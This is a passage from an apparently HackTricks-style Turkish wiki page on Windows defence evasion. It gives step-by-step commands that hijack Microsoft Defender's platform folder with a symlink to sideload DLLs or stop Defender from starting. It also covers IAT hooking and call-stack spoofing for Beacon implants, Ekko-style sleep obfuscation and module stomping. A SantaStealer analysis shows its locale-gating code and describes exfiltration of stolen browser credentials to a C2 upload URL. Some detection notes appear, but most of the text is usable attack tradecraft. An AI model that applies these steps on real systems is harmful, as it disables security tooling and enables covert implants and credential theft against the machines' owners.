- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Platform Version Folder Symlink Hijack ile Microsoft Defender'a Tampering

Windows Defender çalışacağı platformu, şuradaki alt klasörleri enumerate ederek seçer:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

En yüksek lexicographic version string'e sahip alt klasörü seçer (ör. `4.18.25070.5-0`), sonra Defender service processes'ı buradan başlatır (service/registry paths buna göre güncellenir). Bu seçim, directory reparse points (symlinks) dahil directory entries'ye güvenir. Bir administrator bunu Defender'ı attacker-writable bir path'e yönlendirmek ve DLL sideloading veya service disruption elde etmek için kullanabilir.

Önkoşullar
- Local Administrator (Platform folder altında directories/symlinks oluşturmak için gerekli)
- Reboot etme veya Defender platform yeniden seçimini tetikleme yeteneği (boot sırasında service restart)
- Sadece built-in tools gerekir (mklink)

Neden çalışır
- Defender kendi klasörlerindeki yazmaları engeller, ancak platform seçimi directory entries'ye güvenir ve hedefin protected/trusted bir path'e çözümlenip çözülmediğini doğrulamadan lexicographically en yüksek version'ı seçer.

Adım adım (örnek)
1) Mevcut platform klasörünün yazılabilir bir kopyasını hazırlayın, ör. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform içinde klasörünüze işaret eden daha yüksek sürümlü bir dizin sembolik bağlantısı oluşturun:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger seçimi (yeniden başlatma önerilir):
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend) işlemcisinin yönlendirilmiş yoldan çalıştığını doğrulayın:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Yeni işlem yolunu `C:\TMP\AV\` altında ve bu konumu yansıtan servis yapılandırmasını/kaydını gözlemlemelisiniz.

Post-exploitation options
- DLL sideloading/code execution: Defender’ın uygulama dizininden yüklediği DLL’leri bırak/değiştir ve Defender’ın süreçlerinde kod çalıştır. Yukarıdaki bölüme bakın: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlink’i kaldırın; böylece bir sonraki başlangıçta yapılandırılan yol çözümlenmez ve Defender başlatılamaz:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Bu teknik tek başına privilege escalation sağlamaz; admin rights gerektirir.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams, runtime evasion’ı C2 implant’ın dışına çıkarıp hedef module’ün içine taşıyabilir; bunun için onun Import Address Table (IAT)’ını hook’layıp seçili API’leri attacker-controlled, position‑independent code (PIC) üzerinden yönlendirebilirler. Bu, evasion’ı birçok kit’in sunduğu küçük API yüzeyinin ötesine genelleştirir (örn. CreateProcessA) ve aynı korumaları BOF’lara ve post‑exploitation DLL’lerine de genişletir.

High-level yaklaşım
- Hedef module ile birlikte bir PIC blob stage edin; bunu reflective loader (prepended veya companion) kullanarak yapın. PIC self-contained ve position‑independent olmalıdır.
- Host DLL load olduğunda, IMAGE_IMPORT_DESCRIPTOR’ını gezin ve hedef import’lar için IAT entry’lerini (örn. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) ince PIC wrapper’larına patch’leyin.
- Her PIC wrapper, gerçek API address’ına tail-call yapmadan önce evasion’ları çalıştırır. Tipik evasion’lar şunları içerir:
- Call öncesi memory mask/unmask (örn. beacon bölgelerini encrypt etmek, RWX→RX, page name/permissions değiştirmek) ve sonra call sonrası eski haline döndürmek.
- Call-stack spoofing: benign bir stack oluşturup hedef API’ye geçiş yapmak, böylece call-stack analysis beklenen frame’leri çözümler.
- Uyumluluk için bir interface export edin; böylece bir Aggressor script (veya eşdeğeri), Beacon, BOF’lar ve post‑ex DLL’ler için hangi API’lerin hook’lanacağını register edebilir.

Neden burada IAT hooking
- Tool code’unu değiştirmeden veya Beacon’ın belirli API’leri proxy etmesine güvenmeden, hook’lanan import’u kullanan herhangi bir code ile çalışır.
- Post‑ex DLL’leri kapsar: LoadLibrary* hook’lamak, module load’larını intercept etmenizi sağlar (örn. System.Management.Automation.dll, clr.dll) ve aynı masking/stack evasion’ı onların API call’larına uygular.
- CreateProcessA/W’yi wrap ederek, call-stack tabanlı detections’a karşı process-spawning post‑ex komutlarının güvenilir kullanımını geri kazandırır.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notlar
- Yama, relocations/ASLR sonrası ve import ilk kullanımdan önce uygulanmalıdır. TitanLdr/AceLdr gibi reflective loaders, yüklenen modülün DllMain sırasında hooking yaptığını gösterir.
- Wrapper'ları küçük ve PIC-safe tut; gerçek API'yi, patching öncesi yakaladığın orijinal IAT değeri üzerinden ya da LdrGetProcedureAddress ile çöz.
- PIC için RW → RX geçişleri kullan ve writable+executable sayfaları bırakmaktan kaçın.

Call‑stack spoofing stub
- Draugr‑style PIC stubs, sahte bir call chain oluşturur (iyi huylu modüllere giden return address'ler) ve ardından gerçek API'ye pivot eder.
- Bu, Beacon/BOFs'tan sensitive APIs'e giden canonical stack'leri bekleyen detections'ı bozar.
- API prologue'dan önce beklenen frame'lere inmek için bunu stack cutting veya stack stitching teknikleriyle eşleştir.

Operational integration
- Reflective loader'ı post-ex DLL'lerin başına ekle; böylece DLL yüklendiğinde PIC ve hooks otomatik olarak initialize olur.
- Target APIs'yi register etmek için bir Aggressor script kullan; böylece Beacon ve BOFs kod değişikliği olmadan aynı evasion path'ten şeffaf biçimde yararlanır.

Detection/DFIR considerations
- IAT integrity: non-image (heap/anon) adreslere çözümlenen entries; import pointers için periyodik doğrulama.
- Stack anomalies: loaded image'lara ait olmayan return address'ler; non-image PIC'ye ani geçişler; tutarsız RtlUserThreadStart ancestry.
- Loader telemetry: IAT'ye in-process writes, import thunks'u değiştiren erken DllMain activity, load sırasında oluşturulan beklenmedik RX regions.
- Image-load evasion: eğer hooking LoadLibrary* yapılıyorsa, memory masking events ile korelasyonlu şüpheli automation/clr assemblies yüklemelerini izle.

Related building blocks and examples
- Load sırasında IAT patching yapan reflective loaders (ör. TitanLdr, AceLdr)
- Memory masking hooks (ör. simplehook) ve stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (ör. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Resident bir PICO üzerinden import-time IAT hooks

Eğer reflective loader'ı kontrol ediyorsan, loader'ın `GetProcAddress` pointer'ını önce hooks'ları kontrol eden özel bir resolver ile değiştirerek `ProcessImports()` sırasında import'ları **during** hook edebilirsin:

- Geçici loader PIC kendini free ettikten sonra da yaşayan resident bir PICO (persistent PIC object) oluştur.
- Loader'ın import resolver'ını üzerine yazan bir `setup_hooks()` function export et (ör. `funcs.GetProcAddress = _GetProcAddress`).
- `_GetProcAddress` içinde ordinal imports'u atla ve `__resolve_hook(ror13hash(name))` gibi hash-based bir hook lookup kullan. Bir hook varsa onu döndür; yoksa gerçek `GetProcAddress`'e delege et.
- Crystal Palace `addhook "MODULE$Func" "hook"` entries ile link time'da hook targets register et. Hook, resident PICO içinde yaşadığı için geçerli kalır.

Bu, yüklenen DLL'nin code section'ını load sonrası patch'lemeden **import-time IAT redirection** sağlar.

### Target PEB-walking kullandığında hook'lanabilir imports'u zorlamak

Import-time hooks yalnızca fonksiyon gerçekten target'ın IAT'sinde varsa tetiklenir. Bir module API'leri PEB-walk + hash ile çözümlüyorsa (import entry yoksa), loader'ın `ProcessImports()` path'inin bunu görmesi için gerçek bir import zorla:

- Hash'li export resolution'ı (ör. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) `&WaitForSingleObject` gibi doğrudan bir reference ile değiştir.
- Compiler bir IAT entry üretir; böylece reflective loader import'ları çözdüğünde interception mümkün olur.

### Sleep() patch'lemeden Ekko-style sleep/idle obfuscation

`Sleep` patch'lemek yerine, implant'ın kullandığı **gerçek wait/IPC primitives**'leri hook'la (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Uzun waits için, in-memory image'ı idle sırasında encrypt eden Ekko-style bir obfuscation chain içinde çağrıyı sar:

- `CreateTimerQueueTimer` kullanarak `NtContinue` çağıran crafted `CONTEXT` frames ile bir callback sequence planla.
- Tipik chain (x64): image'ı `PAGE_READWRITE` yap → `advapi32!SystemFunction032` ile tam mapped image üzerinde RC4 encrypt et → blocking wait'i gerçekleştir → RC4 decrypt et → PE sections'ı dolaşarak section başına permissions'ları **restore et** → completion signal ver.
- `RtlCaptureContext`, bir `CONTEXT` template'i sağlar; bunu birden çok frame'e kopyala ve register'ları (`Rip/Rcx/Rdx/R8/R9`) her adımı invoke edecek şekilde ayarla.

Operational detail: uzun waits için “success” döndür (ör. `WAIT_OBJECT_0`) ki caller image maskelenmişken devam etsin. Bu pattern, idle windows sırasında module'ü scanners'dan gizler ve klasik “patched `Sleep()`” signature'ından kaçınır.

Detection fikirleri (telemetry-based)
- `NtContinue`'a işaret eden `CreateTimerQueueTimer` callback burst'ları.
- Büyük, contiguous image-sized buffers üzerinde kullanılan `advapi32!SystemFunction032`.
- Large-range `VirtualProtect` ardından custom per-section permission restoration.


## Precision Module Stomping

Module stomping, payload'ları yeni bir sacrificial DLL load etmek veya bariz private executable memory allocate etmek yerine, target process içinde zaten mapped olan bir DLL'nin **`.text` section**'ından çalıştırır. Overwrite target, process'in hâlâ ihtiyaç duyduğu code path'leri bozmayacak şekilde payload'ı absorbe edebilen **loaded, disk-backed image** olmalıdır.

### Reliable target selection

`uxtheme.dll` veya `comctl32.dll` gibi yaygın modüllere karşı naive stomping kırılgandır: DLL remote process'te yüklü olmayabilir ve fazla küçük bir code region process'i crash eder. Daha güvenilir iş akışı:

1. Target process modules'ini enumerate et ve zaten loaded olan DLL'ler için **yalnızca names içeren bir include list** tut.
2. Payload'ı önce build et ve **exact byte size**'ını kaydet.
3. Disk üzerindeki aday DLL'leri tara ve PE section **`.text` `Misc_VirtualSize`** değerini payload size ile karşılaştır. Bu, file size'dan daha önemlidir çünkü memory'de map edildiğinde executable section'ın boyutunu yansıtır.
4. **Export Address Table (EAT)**'i parse et ve stomp başlangıç offset'i olarak bir exported function RVA seç.
5. **Blast radius**'u hesapla: payload seçilen function boundary'yi aşarsa, memory'de onun ardından düzenlenmiş adjacent exports üzerine yazar.

Wild'da görülen tipik recon/selection helpers:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
İşlemsel notlar
- `LoadLibrary`/beklenmedik image yüklemelerinin telemetrisinden kaçınmak için uzak süreçte **zaten yüklenmiş** DLLs’leri tercih et.
- Hedef uygulama tarafından nadiren çalıştırılan export’ları tercih et; aksi halde normal code paths, thread creation öncesinde ya da sonrasında stomped bytes’lara dokunabilir.
- Büyük implants genellikle shellcode embedding’i bir string literal’den tam buffer’ın injector source içinde doğru temsil edilmesi için **byte-array/braced initializer**’a değiştirmeyi gerektirir.

Detection fikirleri
- Uzak yazmaların, daha yaygın private RWX/RX allocations yerine **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) içine yapılması.
- Bellekteki bytes’ları diskteki backing file ile artık eşleşmeyen export entry points.
- Çalışmayı meşru bir DLL export’u içinde başlatan, ancak ilk bytes’ları kısa süre önce değiştirilmiş olan suspicious remote threads veya context pivots.
- DLL `.text` pages’lerine karşı yapılan, ardından thread creation ile devam eden şüpheli `VirtualProtect(Ex)` / `WriteProcessMemory` sequence’leri.

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) modern info-stealers’ın AV bypass, anti-analysis ve credential access’i tek bir workflow içinde nasıl birleştirdiğini gösterir.

### Keyboard layout gating & sandbox delay

- Bir config flag (`anti_cis`), `GetKeyboardLayoutList` üzerinden yüklü keyboard layouts’ları listeler. Eğer bir Cyrillic layout bulunursa, örnek çalıştırmadan önce boş bir `CIS` işareti bırakır ve sonlandırır; böylece bir hunting artifact bırakarak dışlanan yerellerde asla detonasyon yapmaz.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Katmanlı `check_antivm` mantığı

- Variant A süreç listesini tarar, her adıma özel rolling checksum ile her ismi hash’ler ve bunu debugger/sandbox için gömülü blocklists ile karşılaştırır; ayrıca checksum’u bilgisayar adı üzerinde tekrarlar ve `C:\analysis` gibi çalışma dizinlerini kontrol eder.
- Variant B sistem özelliklerini inceler (process-count floor, recent uptime), VirtualBox eklerini tespit etmek için `OpenServiceA("VBoxGuest")` çağırır ve single-stepping’i fark etmek için sleep etrafında timing checks yapar. Herhangi bir sonuç modüller başlamadan önce abort eder.

### Fileless helper + double ChaCha20 reflective loading

- Birincil DLL/EXE, ya diske bırakılan ya da bellekte manuel mapped edilen bir Chromium credential helper gömer; fileless mode importları/relocations’ları kendi çözer, böylece hiçbir helper artifact yazılmaz.
- Bu helper, ChaCha20 ile iki kez şifrelenmiş ikinci aşama bir DLL saklar (iki 32-byte key + 12-byte nonce). Her iki geçişten sonra blob’u reflectively load eder (`LoadLibrary` yok) ve [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) üzerinden türetilmiş `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` exportlarını çağırır.
- ChromElevator rutinleri, canlı bir Chromium browser içine inject etmek için direct-syscall reflective process hollowing kullanır, AppBound Encryption key’lerini devralır ve ABE hardening’e rağmen passwords/cookies/credit cards’ı doğrudan SQLite databases’den decrypt eder.


### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log`, global bir `memory_generators` function-pointer tablosunu dolaşır ve etkinleştirilmiş her modül için bir thread başlatır (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Her thread sonuçları shared buffers içine yazar ve ~45s join window sonrasında file count’unu raporlar.
- İşlem bitince her şey statik linked `miniz` library ile `%TEMP%\\Log.zip` olarak ziplenir. Ardından `ThreadPayload1` 15s uyur ve arşivi `http://<C2>:6767/upload` adresine 10 MB chunk’lar halinde HTTP POST ile stream eder; bir browser `multipart/form-data` boundary’si (`----WebKitFormBoundary***`) spoof edilir. Her chunk `User-Agent: upload`, `auth: <build_id>`, opsiyonel `w: <campaign_tag>` ekler ve son chunk `complete: true` ekler; böylece C2 reassembly’nin tamamlandığını bilir.

## References


- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
